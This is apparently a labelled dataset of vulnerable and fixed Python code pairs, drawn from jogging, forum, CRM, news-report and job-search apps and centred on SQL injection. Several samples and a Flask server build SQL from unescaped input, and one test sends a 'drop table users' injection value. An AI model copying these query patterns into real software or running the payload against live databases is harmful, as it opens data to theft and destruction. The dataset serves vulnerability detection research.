from jogging.Models.user import User

username = None
access_token = None
refresh_token = None


@pytest.yield_fixture
def app():
    config.app = Sanic(""test_sanic_app"")
    config_app()
    yield config.app


@pytest.fixture
def test_cli(loop, app, sanic_client):

    global username
    while username is None:
        i = random.randint(1, 10000)
        username = f""amichay.oren+{i}@gmail.com""
        if User.username_exists(username):
            username = None

    return loop.run_until_complete(sanic_client(app))


async def test_positive_register_(test_cli):
    data = {""username"": username, ""password"": ""testing123G""}
    resp = await test_cli.post(""/users"", data=json.dumps(data))
    assert resp.status == 201


async def test_positive_login(test_cli):
    data = {""username"": username, ""password"": ""testing123G""}
    resp = await test_cli.post(""/auth"", data=json.dumps(data))
    resp_json = await resp.json()
    print(resp_json)
    global access_token
    access_token = resp_json[""access_token""]
    global refresh_token
    refresh_token = resp_json[""refresh_token""]
    assert access_token is not None
    assert refresh_token is not None
    assert resp.status == 200


async def test_negative_jogging_result(test_cli):
    global access_token
    global refresh_token
    headers = {""Authorization"": f""Bearer {access_token}""}
    data = {
        ""date"": ""1971-06-20"",
        ""distance"": 2000,
        ""time"": 405,
        ""location"": ""32.0853 34.7818"",
    }
    resp = await test_cli.post(
        ""/results"", headers=headers, data=json.dumps(data)
    )
    assert resp.status == 400


async def test_positive_jogging_result(test_cli):
    global access_token
    global refresh_token
    headers = {""Authorization"": f""Bearer {access_token}""}
    data = {
        ""date"": ""2015-06-20"",
        ""distance"": 2000,
        ""time"": 405,
        ""location"": ""32.0853 34.7818"",
    }
    resp = await test_cli.post(
        ""/results"", headers=headers, data=json.dumps(data)
    )
    assert resp.status == 201


async def test_positive_load_dataset(test_cli):
    import csv

    global access_token
    global refresh_token
    headers = {""Authorization"": f""Bearer {access_token}""}

    dsreader = csv.reader(open(""jogging_dataset.csv""), delimiter="","")
    for row in dsreader:
        data = {
            ""date"": row[0],
            ""location"": row[1],
            ""distance"": int(row[2]),
            ""time"": int(row[3]),
        }
        resp = await test_cli.post(
            ""/results"", headers=headers, data=json.dumps(data)
        )
        assert resp.status == 201


async def test_negative_jogging_result_no_uath(test_cli):
    global access_token
    global refresh_token
    data = {
        ""date"": ""2015-06-20"",
        ""distance"": 2000,
        ""time"": 405,
        ""location"": ""32.0853 34.7818"",
    }
    resp = await test_cli.post(""/results"", data=json.dumps(data))
    assert resp.status == 400


async def test_positive_get_all_results(test_cli):
    global access_token
    global refresh_token
    headers = {""Authorization"": f""Bearer {access_token}""}

    resp = await test_cli.get(""/results"", headers=headers)
    resp_json = await resp.json()

    assert resp.status == 200


async def test_positive_get_paging(test_cli):
    global access_token
    global refresh_token
    headers = {""Authorization"": f""Bearer {access_token}""}

    resp = await test_cli.get(
        ""/results?page=0&count=2"", headers=headers
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 2

    resp = await test_cli.get(
        ""/results?page=1&count=1"", headers=headers
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 1


async def test_negative_bad_paging(test_cli):
    global access_token
    global refresh_token
    headers = {""Authorization"": f""Bearer {access_token}""}

    resp = await test_cli.get(
        ""/results?page=-1&count=2"", headers=headers
    )
    assert resp.status == 400

    resp = await test_cli.get(
        ""/results?page=1&count=0"", headers=headers
    )
    assert resp.status == 400


async def test_negative_sql_injection(test_cli):
    global access_token
    global refresh_token
    headers = {""Authorization"": f""Bearer {access_token}""}

    resp = await test_cli.get(
        ""/results?page=0&count=2&filter=%3Bdrop table users%3B"",
        headers=headers,
    )
    assert resp.status == 400


async def test_positive_check_filters(test_cli):
    global access_token
    global refresh_token
    headers = {""Authorization"": f""Bearer {access_token}""}

    resp = await test_cli.get(
        ""/results?page=0&count=2&filter=date eq '2019-07-15'"",
        headers=headers,
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 1

    resp = await test_cli.get(
        ""/results?filter=(date lt '2018-01-01') AND (time lt 500)"",
        headers=headers,
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 4

    resp = await test_cli.get(
        ""/results?filter=distance ne 2000"", headers=headers
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 8

    resp = await test_cli.get(
        ""/results?filter=distance ne 2000 and ((time lt 400) and (time gt 390))"",
        headers=headers,
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 0
/n/n/n",0
51,51,6479565faf37bc48eed36fed46f7e8ee377f1d1e,"/Models/user.py/n/nfrom sqlalchemy.sql import text
from .dbhelper import engine


class User(object):
    def __init__(
        self, user_id, username, hashed_password, roll_id=1, *args, **kwargs
    ):
        self.user_id = user_id
        self.username = username
        self.hashed_password = hashed_password
        self.roll_id = roll_id

    def to_dict(self):
        return {""user_id"": self.user_id, ""username"": self.username}

    def save(self):
        connection = engine.connect()
        trans = connection.begin()
        try:
            s = text(
                ""INSERT INTO users(username, hashed_password, roll_id) ""
                ""VALUES(:username, :hashed_password, :roll_id)""
            )
            connection.execute(
                s,
                username=self.username,
                hashed_password=self.hashed_password,
                roll_id=self.roll_id,
            )
            trans.commit()
        except:
            trans.rollback()
            raise
        connection.close()

    @classmethod
    def get_by_username(cls, username):
        assert engine
        s = text(
            ""SELECT user_id, username, hashed_password, roll_id ""
            ""FROM users ""
            ""WHERE username = :username AND expire_date is null""
        )
        connection = engine.connect()
        rc = connection.execute(s, username=username).fetchone()
        if rc is not None:
            rc = User(rc[0], rc[1], rc[2].decode(""utf-8""), rc[3])

        connection.close()
        return rc

    @classmethod
    def username_exists(cls, username):
        assert engine
        s = text(
            ""SELECT * ""
            ""FROM users ""
            ""WHERE username = :username AND expire_date is null""
        )
        connection = engine.connect()

        rc = (
            False
            if connection.execute(s, username=username).fetchone() is None
            else True
        )
        connection.close()
        return rc
/n/n/n/Routes/jogging_results.py/n/nimport datetime
import json
from sanic import response
from sanic.exceptions import SanicException, InvalidUsage, add_status_code
from sanic_jwt.decorators import protected
from jogging.Contectors.darksky import get_weather_condition
from jogging.Routes.auth import retrieve_user
from jogging.Models.jogging_result import JoggingResult


@add_status_code(409)
class Conflict(SanicException):
    pass


@protected()
async def add_jogging_result(request, *args, **kwargs):
    if (
        request.json is None
        or ""date"" not in request.json
        or ""distance"" not in request.json
        or ""time"" not in request.json
        or ""location"" not in request.json
    ):
        raise InvalidUsage(
            ""invalid payload (should be {date, distance, time, location})""
        )

    distance = request.json[""distance""]
    if distance <= 0:
        raise InvalidUsage(""distance needs to be positive"")

    try:
        date = datetime.datetime.strptime(
            request.json[""date""], ""%Y-%m-%d""
        ).date()
    except ValueError:
        raise InvalidUsage(""invalid date (should be 'YYYY-MM-DD')"")

    latlong = request.json[""location""].split("" "")

    if len(latlong) != 2:
        raise InvalidUsage(""invalid location (should be 'LAT LONG')"")

    try:
        lat = float(latlong[0])
        long = float(latlong[1])
    except ValueError:
        raise InvalidUsage(
            ""invalid location (lat & long should be floating-point)""
        )

    if not (-90.0 <= lat <= 90.0 and -180 <= long <= 180):
        raise InvalidUsage(
            ""invalid location (The latitude must be a number between -90 and 90 and the longitude between -180 and 180)""
        )

    try:
        time = int(request.json[""time""])
    except ValueError:
        raise InvalidUsage(""invalid time (time should be an integer)"")

    if time <= 0:
        raise InvalidUsage(""invalid time (time should be positive)"")

    condition = await get_weather_condition(lat, long, date)

    if condition is None:
        raise InvalidUsage(
            ""can't fetch running conditions for that location & time""
        )

    user_id = retrieve_user(request, args, kwargs)[""user_id""]

    jog = JoggingResult(
        user_id,
        request.json[""location""],
        date,
        distance,
        time,
        json.dumps(condition[""data""][0]),
    )
    jog.save()

    return response.HTTPResponse(status=201)


@protected()
async def get_jogging_results(request, *args, **kwargs):
    page = int(request.args[""page""][0]) if ""page"" in request.args else 0
    limit = int(request.args[""count""][0]) if ""count"" in request.args else 10

    if page < 0 or limit <= 0:
        raise InvalidUsage(""invalid paging (page >= 0 and count > 0)"")

    q_filter = request.args[""filter""][0] if ""filter"" in request.args else None
    user_id = retrieve_user(request, args, kwargs)[""user_id""]

    return response.json(
        JoggingResult.load(user_id, q_filter, page, limit), status=200
    )
/n/n/n/Tests/test_jogging_results.py/n/nimport pytest
from sanic import Sanic
import random
import json
from jogging.main import config_app
from jogging import config
from jogging.Models.user import User

username = None
access_token = None
refresh_token = None


@pytest.yield_fixture
def app():
    config.app = Sanic(""test_sanic_app"")
    config_app()
    yield config.app


@pytest.fixture
def test_cli(loop, app, sanic_client):

    global username
    while username is None:
        i = random.randint(1, 10000)
        username = f""amichay.oren+{i}@gmail.com""
        if User.username_exists(username):
            username = None

    return loop.run_until_complete(sanic_client(app))


async def test_positive_register_(test_cli):
    data = {""username"": username, ""password"": ""testing123G""}
    resp = await test_cli.post(""/users"", data=json.dumps(data))
    assert resp.status == 201


async def test_positive_login(test_cli):
    data = {""username"": username, ""password"": ""testing123G""}
    resp = await test_cli.post(""/auth"", data=json.dumps(data))
    resp_json = await resp.json()
    print(resp_json)
    global access_token
    access_token = resp_json[""access_token""]
    global refresh_token
    refresh_token = resp_json[""refresh_token""]
    assert access_token is not None
    assert refresh_token is not None
    assert resp.status == 200


async def test_negative_jogging_result(test_cli):
    global access_token
    global refresh_token
    headers = {""Authorization"": f""Bearer {access_token}""}
    data = {
        ""date"": ""1971-06-20"",
        ""distance"": 2000,
        ""time"": 405,
        ""location"": ""32.0853 34.7818"",
    }
    resp = await test_cli.post(
        ""/results"", headers=headers, data=json.dumps(data)
    )
    assert resp.status == 400


async def test_positive_jogging_result(test_cli):
    global access_token
    global refresh_token
    headers = {""Authorization"": f""Bearer {access_token}""}
    data = {
        ""date"": ""2015-06-20"",
        ""distance"": 2000,
        ""time"": 405,
        ""location"": ""32.0853 34.7818"",
    }
    resp = await test_cli.post(
        ""/results"", headers=headers, data=json.dumps(data)
    )
    assert resp.status == 201


async def test_positive_load_dataset(test_cli):
    import csv

    global access_token
    global refresh_token
    headers = {""Authorization"": f""Bearer {access_token}""}

    dsreader = csv.reader(open(""jogging_dataset.csv""), delimiter="","")
    for row in dsreader:
        data = {
            ""date"": row[0],
            ""location"": row[1],
            ""distance"": int(row[2]),
            ""time"": int(row[3]),
        }
        resp = await test_cli.post(
            ""/results"", headers=headers, data=json.dumps(data)
        )
        assert resp.status == 201


async def test_negative_jogging_result_no_uath(test_cli):
    global access_token
    global refresh_token
    data = {
        ""date"": ""2015-06-20"",
        ""distance"": 2000,
        ""time"": 405,
        ""location"": ""32.0853 34.7818"",
    }
    resp = await test_cli.post(""/results"", data=json.dumps(data))
    assert resp.status == 400


async def test_positive_get_all_results(test_cli):
    global access_token
    global refresh_token
    headers = {""Authorization"": f""Bearer {access_token}""}

    resp = await test_cli.get(""/results"", headers=headers)
    resp_json = await resp.json()

    assert resp.status == 200


async def test_positive_get_paging(test_cli):
    global access_token
    global refresh_token
    headers = {""Authorization"": f""Bearer {access_token}""}

    resp = await test_cli.get(""/results?page=0&count=2"", headers=headers)
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 2

    resp = await test_cli.get(""/results?page=1&count=1"", headers=headers)
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 1


async def test_negative_bad_paging(test_cli):
    global access_token
    global refresh_token
    headers = {""Authorization"": f""Bearer {access_token}""}

    resp = await test_cli.get(""/results?page=-1&count=2"", headers=headers)
    assert resp.status == 400

    resp = await test_cli.get(""/results?page=1&count=0"", headers=headers)
    assert resp.status == 400


async def test_positive_check_filters(test_cli):
    global access_token
    global refresh_token
    headers = {""Authorization"": f""Bearer {access_token}""}

    resp = await test_cli.get(
        ""/results?page=0&count=2&filter=date eq '2019-07-15'"", headers=headers
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 1

    resp = await test_cli.get(
        ""/results?filter=(date lt '2018-01-01') AND (time lt 500)"",
        headers=headers,
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 4

    resp = await test_cli.get(
        ""/results?filter=distance ne 2000"", headers=headers
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 8

    resp = await test_cli.get(
        ""/results?filter=distance ne 2000 and ((time lt 400) and (time gt 390))"",
        headers=headers,
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 0
/n/n/n",1
120,120,1a5d6ccf02bec303d454f87a6bb39baed30c205f,"vagrant/forum/forumdb.py/n/n# ""Database code"" for the DB Forum.

import psycopg2

DBNAME = ""forum""

def get_posts():
  """"""Return all posts from the 'database', most recent first.""""""
  db = psycopg2.connect(database=DBNAME)
  c = db.cursor()
  c.execute(""select content,time from posts order by time desc"")
  return c.fetchall()
  db.close()

def add_post(content):
  """"""Add a post to the 'database' with the current timestamp.""""""
  db = psycopg2.connect(database=DBNAME)
  c = db.cursor()
  c.execute(""insert into posts values(%s)"",(content,))
  db.commit()
  db.close()
/n/n/n",0
121,121,1a5d6ccf02bec303d454f87a6bb39baed30c205f,"/vagrant/forum/forumdb.py/n/n# ""Database code"" for the DB Forum.

import psycopg2

DBNAME = ""forum""

def get_posts():
  """"""Return all posts from the 'database', most recent first.""""""
  db = psycopg2.connect(database=DBNAME)
  c = db.cursor()
  c.execute(""select content,time from posts order by time desc"")
  return c.fetchall()
  db.close()

def add_post(content):
  """"""Add a post to the 'database' with the current timestamp.""""""
  db = psycopg2.connect(database=DBNAME)
  c = db.cursor()
  c.execute(""insert into posts values('%s')"" % content)
  db.commit()
  db.close()
/n/n/n",1
160,160,3e639e33ad53338d9142d700b59ca68dd5c81c27,"crapo_tests/models/crm_stage.py/n/n# coding: utf-8

""""""
©2019
License: AGPL-3

@author: C. Guychard (Article 714)

""""""


from odoo import models, api
from odoo.addons.base_crapo_workflow.mixins import crapo_automata_mixins

import logging


class CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):
    _inherit = ""crm.stage""
    _state_for_model = ""crm.lead""

    def write(self, values):
        if len(self) == 1:
            if 'crapo_state' not in values and not self.crapo_state:
                if 'name' in values:
                    vals = {'name': values['name']}
                else:
                    vals = {'name': self.name}
                mystate = self._compute_related_state(vals)
                values['crapo_state'] = mystate.id

        return super(CrmStageWithMixin, self).write(values)

    @api.model
    def create(self, values):
        if 'crapo_state' not in values and not self.crapo_state:
            if 'name' in values:
                vals = {'name': values['name']}
            mystate = self._compute_related_state(vals)
            values['crapo_state'] = mystate.id

        return super(CrmStageWithMixin, self).create(values)

    @api.model_cr_context
    def _init_column(self, column_name):
        """""" Initialize the value of the given column for existing rows.
            Overridden here because we need to wrap existing stages in
            a new crapo_state for each stage (including a default automaton)
        """"""
        if column_name not in [""crapo_state""]:
            super(CrmStageWithMixin, self)._init_column(column_name)
        else:
            default_compute = self._compute_related_state

            query = 'SELECT id, name FROM ""%s"" WHERE ""%s"" is NULL' % (  # pylint: disable=sql-injection
                self._table, column_name)
            self.env.cr.execute(query)
            stages = self.env.cr.fetchall()

            for stage in stages:
                default_value = default_compute(
                    self, values={'name': stage[1]})

                query = 'UPDATE ""%s"" SET ""%s""=%%s WHERE id = %s' % (  # pylint: disable=sql-injection
                    self._table, column_name, stage[0])
                logging.error(""TADAAA: %s"" % query)
                self.env.cr.execute(query, (default_value,))
/n/n/n",0
161,161,3e639e33ad53338d9142d700b59ca68dd5c81c27,"/crapo_tests/models/crm_stage.py/n/n# coding: utf-8

""""""
©2019
License: AGPL-3

@author: C. Guychard (Article 714)

""""""


from odoo import models, api
from odoo.addons.base_crapo_workflow.mixins import crapo_automata_mixins

import logging


class CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):
    _inherit = ""crm.stage""
    _state_for_model = ""crm.lead""

    def write(self, values):
        if len(self) == 1:
            if 'crapo_state' not in values and not self.crapo_state:
                if 'name' in values:
                    vals = {'name': values['name']}
                else:
                    vals = {'name': self.name}
                mystate = self._compute_related_state(vals)
                values['crapo_state'] = mystate.id

        return super(CrmStageWithMixin, self).write(values)

    @api.model
    def create(self, values):
        if 'crapo_state' not in values and not self.crapo_state:
            if 'name' in values:
                vals = {'name': values['name']}
            mystate = self._compute_related_state(vals)
            values['crapo_state'] = mystate.id

        return super(CrmStageWithMixin, self).create(values)

    @api.model_cr_context
    def _init_column(self, column_name):
        """""" Initialize the value of the given column for existing rows.
            Overridden here because we need to wrap existing stages in
            a new crapo_state for each stage (including a default automaton)
        """"""
        if column_name not in [""crapo_state""]:
            super(CrmStageWithMixin, self)._init_column(column_name)
        else:
            default_compute = self._compute_related_state

            query = 'SELECT id, name FROM ""%s"" WHERE ""%s"" is NULL' % (
                self._table, column_name)
            self.env.cr.execute(query)
            stages = self.env.cr.fetchall()

            for stage in stages:
                default_value = default_compute(
                    self, values={'name': stage[1]})

                query = 'UPDATE ""%s"" SET ""%s""=%%s WHERE id = %s' % (
                    self._table, column_name, stage[0])
                logging.error(""TADAAA: %s"" % query)
                self.env.cr.execute(query, (default_value,))
/n/n/n",1
104,104,20fefbde3738088586a3c5679f743493d0a504f6,"news_data_analysis.py/n/n#!/usr/bin/env python3
import psycopg2
from psycopg2 import sql


def get_top_articles(cur, limit):
    """"""Fetches the top articles.

    Fetches the number of top articles in the specified
    order.

    Args:
        cur(obj): The cursor to execute the query.
        limit(int): The number of rows to view.

    Return:
        True if success, False otherwise.
    """"""
    data = (limit, )
    query = '''SELECT articles.title, COUNT(*) as views
            FROM log, articles
            WHERE log.path = '/article/'||articles.slug AND
            log.method = 'GET'
            GROUP BY articles.title
            ORDER BY views DESC
            LIMIT %s'''
    rows = get_data(cur, query, data)

    # Write data to txt file.
    if rows is not None:
        file = open(""top_articles_report.txt"", ""w"")
        for row in rows:
            file.write(""\""{}\"" - {} views \n"".format(row[0], row[1]))
        file.close()

        return True
    else:
        return False


def get_top_authors(cur):
    """"""Fetches the top authors.

    Args:
        cur(obj): The cursor to execute the query.

    Return:
        True if success, False otherwise.
    """"""
    data = ()
    query = '''SELECT authors.name, COUNT(*) as views
            FROM authors, articles, log
            WHERE authors.id = articles.author AND
            log.path = '/article/'||articles.slug AND
            log.method = 'GET'
            GROUP BY authors.name
            ORDER BY COUNT(*) DESC'''
    rows = get_data(cur, query, data)

    # Write data to txt file.
    if rows is not None:
        file = open(""top_authors_report.txt"", ""w"")
        for row in rows:
            file.write(""{} - {} views \n"".format(row[0], row[1]))
        file.close()

        return True
    else:
        return False


def get_error_days(cur, error_percent):
    """"""Fetches the days in which requests led to errors.

    Fetches the days in which the specified percentage
    of requests led to errors.

    Args:
        cur(obj): The cursor to execute the query.
        error_percent(int): The percentage of requests that led to errors.

    Return:
        True if success, False otherwise.
    """"""
    data = (error_percent, )
    query = '''SELECT to_char(log_errors.date, 'Mon DD YYYY'),
            round((log_errors.errors * 100
            / log_requests.total::numeric), 2) as percent
            FROM log_errors, log_requests
            WHERE log_errors.date = log_requests.date AND
            log_errors.errors * 100
            / log_requests.total::numeric > %s
            ORDER BY log_errors.date'''
    rows = get_data(cur, query, data)

    # Write data to txt file.
    if rows is not None:
        file = open(""error_report.txt"", ""w"")
        for row in rows:
            file.write(""{} - {}% errors \n"".format(row[0], row[1]))
        file.close()

        return True
    else:
        return False


def get_data(cur, query, data):
    """"""Fetches the data specified in the query.

    Args:
        cur(obj): The cursor to execute the query.
        query(str): The query to execute.
        data(tuple): The values to insert into the query.

    Return:
        The data or None if there is an error.
    """"""
    try:
        cur.execute(query, data)
        return cur.fetchall()
    except psycopg2.Error as e:
        print(e)
        cur.connection.rollback()
        return None


def setup_connection(db_name):
    """"""Sets up the database connection.

    Sets up a Postgre database connection with passed in
    database's name.

    Args:
        db_name(str): The name of the database to connect to.

    Returns:
        A cursor to the database.
    """"""
    try:
        return psycopg2.connect(dbname=db_name)
    except psycopg2.Error as e:
        print(e)


def main():
    """"""Main function to run the code.""""""
    conn = setup_connection(""news"")

    if conn is not None:
        cur = conn.cursor()
        # Create top articles report.
        if get_top_articles(cur, 3):
            print(""Successful creating top articles report."")
        else:
            print(""Error creating top articles report."")
        # Create top authors report.
        if get_top_authors(cur):
            print(""Successful creating top authors report."")
        else:
            print(""Error creating top authors report."")
        # Create error report.
        if get_error_days(cur, 1):
            print(""Successful creating daily error percentage report."")
        else:
            print(""Error creating daily error percentage report."")

        conn.close()

if __name__ == '__main__':
    main()
/n/n/n",0
105,105,20fefbde3738088586a3c5679f743493d0a504f6,"/news_data_analysis.py/n/n#!/usr/bin/env python3
import psycopg2


def get_top_articles(cur, order, limit):
    """"""Fetches the top articles.

    Fetches the number of top articles in the specified
    order.

    Args:
        cur(obj): The cursor to execute the query.
        order(str): The order to view the rows in.
        limit(int): The number of rows to view.

    Return:
        True if success, False otherwise.
    """"""
    query = '''SELECT articles.title, COUNT(*) as views
            FROM log, articles
            WHERE log.path LIKE '%'||articles.slug AND
            log.method = 'GET'
            GROUP BY articles.title
            ORDER BY views {}
            LIMIT {}'''.format(order, limit)
    rows = get_data(cur, query)

    # Write data to txt file.
    if rows is not None:
        file = open(""top_articles_report.txt"", ""w"")
        for row in rows:
            file.write(""\""{}\"" - {} views \n"".format(row[0], row[1]))
        file.close()

        return True
    else:
        return False


def get_top_authors(cur, order):
    """"""Fetches the top authors.

    Args:
        cur(obj): The cursor to execute the query.
        order(str): The order to view the rows in.

    Return:
        True if success, False otherwise.
    """"""
    query = '''SELECT authors.name, COUNT(*) as views
            FROM authors, articles, log
            WHERE authors.id = articles.author AND
            log.path LIKE '%'||articles.slug AND
            log.method = 'GET'
            GROUP BY authors.name
            ORDER BY views {}'''.format(order)
    rows = get_data(cur, query)

    # Write data to txt file.
    if rows is not None:
        file = open(""top_authors_report.txt"", ""w"")
        for row in rows:
            file.write(""{} - {} views \n"".format(row[0], row[1]))
        file.close()

        return True
    else:
        return False


def get_error_days(cur, error_percent):
    """"""Fetches the days in which requests led to errors.

    Fetches the days in which the specified percentage
    of requests led to errors.

    Args:
        cur(obj): The cursor to execute the query.
        error_percent(int): The percentage of requests that led to errors.

    Return:
        True if success, False otherwise.
    """"""
    query = '''SELECT to_char(log_errors.date, 'Mon DD YYYY'),
            round((log_errors.errors * 100
            / log_requests.total::numeric), 2) as percent
            FROM log_errors, log_requests
            WHERE log_errors.date = log_requests.date AND
            log_errors.errors * 100
            / log_requests.total::numeric > {}
            ORDER BY log_errors.date'''.format(error_percent)
    rows = get_data(cur, query)

    # Write data to txt file.
    if rows is not None:
        file = open(""error_report.txt"", ""w"")
        for row in rows:
            file.write(""{} - {}% errors \n"".format(row[0], row[1]))
        file.close()

        return True
    else:
        return False


def get_data(cur, query):
    """"""Fetches the data specified in the query.

    Args:
        cur(obj): The cursor to execute the query.
        query(str): The query to execute.

    Return:
        The data or None if there is an error.
    """"""
    try:
        cur.execute(query)
        return cur.fetchall()
    except psycopg2.Error:
        cur.connection.rollback()
        return None


def setup_connection(db_name):
    """"""Sets up the database connection.

    Sets up a Postgre database connection with passed in
    database's name.

    Args:
        db_name(str): The name of the database to connect to.

    Returns:
        A cursor to the database.
    """"""
    try:
        return psycopg2.connect(dbname=db_name)
    except psycopg2.Error as e:
        print(e)


def main():
    """"""Main function to run the code.""""""
    conn = setup_connection(""news"")

    if conn is not None:
        cur = conn.cursor()
        # Create top articles report.
        if get_top_articles(cur, ""DESC"", 3):
            print(""Successful creating top articles report."")
        else:
            print(""Error creating top articles report."")
        # Create top authors report.
        if get_top_authors(cur, ""DESC""):
            print(""Successful creating top authors report."")
        else:
            print(""Error creating top authors report."")
        # Create error report.
        if get_error_days(cur, 1):
            print(""Successful creating daily error percentage report."")
        else:
            print(""Error creating daily error percentage report."")

        conn.close()

main()
/n/n/n",1
196,196,fe04bedc72e62fd4c4ee046a9af29fd81e9b3340,"Web-app/Server.py/n/nimport os
from sqlalchemy import *
from flask import Flask, request, render_template, g, redirect, Response, flash, url_for, session
from flask_login import LoginManager, login_user, login_required, logout_user, current_user
from Database import engine
from User import User
# set app and login system
tmpl_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
app = Flask(__name__, template_folder=tmpl_dir)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = ""login""
app.secret_key = 'I love database'


# Get current user's information
@login_manager.user_loader
def load_user(s_id):
    email = str(s_id)
    query = 'select * from usr where email like %s'
    cursor = g.conn.execute(query, (email, ))
    user = User()
    for row in cursor:
        user.name = str(row.name)
        user.email = str(row.email)
        break
    return user


# Prepare the page
@app.before_request
def before_request():
  try:
    g.conn = engine.connect()
  except:
    print ""uh oh, problem connecting to database""
    import traceback; traceback.print_exc()
    g.conn = None


@app.teardown_request
def teardown_request(exception):
  try:
    g.conn.close()
  except Exception:
    pass


# @The function for user login
@app.route(""/login"", methods=[""GET"", ""POST""])
def login():
    error = None
    page = 'login'
    if request.method == 'POST':

        # Obtain input value and pass to User object
        email = str(request.form['email']).strip()
        password = str(request.form['password']).strip()
        user = User(email, password)
        user.user_verify()

        if not user.valid:
            error = 'Invalid login information'
        else:
            session['logged_in'] = True
            login_user(user)
            print current_user.id
            flash('You were logged in')
            g.user = current_user.id
            return redirect(url_for('user_home_page'))

    return render_template('login.html', error=error, page=page)


# @This function is for user sign-up
@app.route(""/signup"", methods=[""GET"", ""POST""])
def signup():
    error = None
    page = 'signup'
    if request.method == 'POST':
        name = str(request.form['username']).strip()
        password = str(request.form['password']).strip()
        email = str(request.form['email']).strip()
        print name, password, email
        newuser = User(email, password, name)
        newuser.insert_new_user()
        if not newuser.valid:
            error = 'Invalid user information, please choose another one'
        else:
            session['logged_in'] = True
            login_user(newuser)
            flash('Thanks for signing up, you are now logged in')
            return redirect(url_for('user_home_page'))
    return render_template('signup.html', error=error, page=page)


@app.route(""/logout"")
@login_required
def logout():
    session.pop('logged_in', None)
    logout_user()
    return redirect(url_for('login'))


'''
This part is the User Homepage, add app functions here
Modify user_home_page.html as well
'''


@app.route(""/"", methods=[""GET"", ""POST""])
@login_required
def user_home_page():
    message = ""Welcome back! "" + current_user.name
    if request.method == 'GET':
        query = '''
        select tmp.jid as id, tmp.name as name, tmp.type as type,
               tmp.sal_from as sfrom, tmp.sal_to as sto, 
               tmp.sal_freq as sfreq, tmp.posting_time as ptime
        from (vacancy v natural join job j) as tmp, application ap
        where ap.uemail = %s and ap.jid = tmp.jid and ap.vtype = tmp.type'''
        cursor = g.conn.execute(query, (session[""user_id""], ))
        data = cursor.fetchall()
        return render_template(""user_home_page.html"", message = message, data = data)
    return render_template(""user_home_page.html"", message = message)


# @Search vacancy with keyword
@app.route(""/search"", methods=[""GET"", ""POST""])
@login_required
def search_vacancy():
    if request.method == 'POST':
        key = str(request.form['keyword']).strip()
        if not key:
            return render_template(""search.html"")
        attr = request.form.get('attr')
        ptf = str(request.form['pt_from']).strip()  # posting time from
        ptt = str(request.form['pt_to']).strip()  # posting time from
        order = request.form.get('order')
        order_attr = request.form.get('order_attr')
        limit = str(request.form['limit']).strip()
        para_list = []
        query = '''
        select j.jid as id, j.name as name, v.type as type,
               v.sal_from as sfrom, v.sal_to as sto, 
               v.sal_freq as sfreq ,v.posting_time as ptime
        from vacancy as v inner join job as j on v.jid = j.jid
        '''
        # where
        # posting time
        if ptf and ptt:
            query += 'where v.posting_time>= %s and v.posting_time<= %s and '
            para_list.append(ptf)
            para_list.append(ptt)
        elif ptf and not ptt:
            query += 'where v.posting_time>= %s and '
            para_list.append(ptf)
        elif not ptf and ptt:
            query += 'where v.posting_time<= %s and '
            para_list.append(ptt)
        else:
            query += 'where '
        # attribute
        if attr == 'name':
            query += 'lower(j.name) like lower(\'%%%s%%\') '    # use lower() to ignore case 
            para_list.append(key)
        elif attr == 'salary':
            query += 'v.sal_from <= %s and v.sal_to >= %s '
            para_list.append(key)
            para_list.append(key)
        elif attr == 'skill':
            query += 'lower(j.pre_skl) like lower(\'%%%s%%\') or lower(j.job_des) like lower(\'%%%s%%\') '
            para_list.append(key)
        # order
        if order_attr == 'pt':
            query += 'order by v.posting_time ' + order
        elif order_attr == 'id':
            query += 'order by j.jid ' + order
        elif order_attr == 'name':
            query += 'order by j.name ' + order
        elif order_attr == 'lows':
            query += 'order by v.sal_from ' + order
        elif order_attr == 'highs':
            query += 'order by v.sal_to ' + order
        # limit
        if limit and limit != 'all':
            query += ' limit %s'
            para_list.append(limit)
        print query
        cursor = g.conn.execute(query, tuple(para_list))
        job = []
        for row in cursor:
            job.append(row)
        data = job
        return render_template(""search.html"", data=data, keyword = key)
    return render_template(""search.html"")

# detailed info of a vacancy
@app.route(""/detailed_info"", methods=[""GET"", ""POST""])
@login_required
def detailed_info():
    if request.method == 'POST':
        jid = request.form.get('jid')
        vtype = request.form.get('vtype')
        query = '''
        select *
        from vacancy v natural join job j
        where j.jid=''' + jid + ' and v.type=\'' + vtype +'\''
        cursor = g.conn.execute(text(query))
        data = cursor.fetchall()
        col_names = ['JID', 'Type', '# Positions', 'Salary from', 'Salary to', 'Salary Frequency', 'Post Until', 'Posting Time', 'Updated Time', 'Unit', 'Agency', 'Level', 'Job Name', 'Preferred Skills', 'Job Description', 'Location', 'Hour/Shift', 'Title code', 'Civil Service TiTle']  # column header
        return render_template(""detailed_info.html"", zippedlist = zip(col_names, data[0]), jid = jid, vtype = vtype) # zip to help us iterate two lists parallelly
    return render_template(""detailed_info.html"")

# apply for the vacancy
@app.route(""/apply"", methods=[""GET"", ""POST""])
@login_required
def apply():
    if request.method == 'POST':
        jid = request.form.get('jid')
        vtype = request.form.get('vtype')
        query = '''
        insert into Application
        values (\'''' + session[""user_id""] + '\', ' + jid + ', \'' + vtype + '\')'  # Zihan: I tried to use current_user.id here and it returned nothing. So I use session[""user_id""] instead.
        g.conn.execute(text(query))
        return render_template(""apply.html"", jid = jid, vtype = vtype)
    return render_template(""apply.html"")

# cancel application for the vacancy
@app.route(""/canel_apply"", methods=[""GET"", ""POST""])
@login_required
def cancel_apply():
